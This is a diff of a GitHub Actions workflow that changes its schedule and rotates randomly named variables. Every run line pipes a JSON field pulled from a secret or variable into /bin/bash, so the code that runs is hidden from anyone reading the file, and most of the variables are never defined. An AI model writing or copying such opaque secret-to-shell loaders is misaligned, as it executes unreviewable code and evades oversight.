@@ -3,7 +3,7 @@ name: xinglianjiqian
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 3/6 * * *'
+    - cron: '39 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,20 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: xinglianjiqian
         env:
-          hut12: ${{ secrets.hut12 }}
+          u0802: ${{ secrets.u0802 }}
         run: |
-          echo $hut12 | jq -r .van70884 | /bin/bash
-          echo $lhpky200 | jq -r .wz0814 | /bin/bash
-          echo $kxy1 | jq -r .eiwu8 | /bin/bash
-          echo $vnhap2 | jq -r .qjbk43340 | /bin/bash
-          echo $xojr1612 | jq -r .ef4193 | /bin/bash
-          echo $we691 | jq -r .uqe80781 | /bin/bash
-          echo $kja681 | jq -r .w3 | /bin/bash
-          echo $iqjn922 | jq -r .d1200 | /bin/bash
-          echo $iypmo6727 | jq -r .stq8 | /bin/bash
-          echo $djp67 | jq -r .jwur15 | /bin/bash
-          echo $r3 | jq -r .qoa3824 | /bin/bash
-          echo $n23 | jq -r .vlu56113 | /bin/bash
-          echo $zdzje930 | jq -r .nt4549 | /bin/bash
-          echo $ksgt4 | jq -r .hotzx122 | /bin/bash
+          echo $u0802 | jq -r .s9 | /bin/bash
+          echo $mthod4916 | jq -r .caol68 | /bin/bash
+          echo $xspf5371 | jq -r .bq829 | /bin/bash
+          echo $gfr651 | jq -r .ptb978 | /bin/bash
+          echo $frgd95647 | jq -r .jrpyr608 | /bin/bash
+          echo $vij30 | jq -r .y9 | /bin/bash
+          echo $sre929 | jq -r .vgwwi13229 | /bin/bash
+          echo $et8 | jq -r .ha30748 | /bin/bash
+          echo $i28 | jq -r .xlkcl716 | /bin/bash
+          echo $i90 | jq -r .os55524 | /bin/bash
+          echo $ry96365 | jq -r .h806 | /bin/bash
+          echo $q767 | jq -r .wmo9254 | /bin/bash
 
